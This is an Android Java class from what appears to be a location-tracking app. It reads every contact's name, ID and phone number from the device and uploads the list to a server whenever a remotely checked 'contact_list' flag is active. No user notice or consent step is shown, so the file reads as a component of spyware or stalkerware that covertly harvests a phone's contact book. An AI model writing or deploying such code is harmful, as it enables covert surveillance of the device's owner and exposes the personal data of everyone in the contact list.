package callDetails;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.google.android.gms.dynamic.IFragmentWrapper;
import com.varbin.locationtracker.APIs.CreaterClass;

import java.util.ArrayList;

import synceAdapter.AccountConstants;

public class contactList {
    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void sendContactToserver(Context contex){
        Log.d("TAG", "sendContactToserver: ");
        ArrayList<contactModel> contacts = getContact(contex);
        boolean flag = CreaterClass.inActive("contact_list");
       if (flag){
           CreaterClass.uploadFileonServer(contacts);
        }

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private static ArrayList<contactModel> getContact(Context contex) {
        ContentResolver contentResolver = contex.getContentResolver();
        String contactId = null;
        String displayName = null;
        ArrayList<contactModel> contactsInfoList = new ArrayList<contactModel>();
        Cursor cursor = contex.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                if (hasPhoneNumber > 0) {

                    contactModel contactsInfo = new contactModel();
                    contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    contactsInfo.setContactId(contactId);
                    contactsInfo.setName(displayName);

                    Cursor phoneCursor = contex.getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null);

                    if (phoneCursor.moveToNext()) {
                        String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        contactsInfo.setContactNumber(phoneNumber);
                    }

                    phoneCursor.close();

                    contactsInfoList.add(contactsInfo);
                }
            }
        }
        cursor.close();
        return contactsInfoList;
    }
}
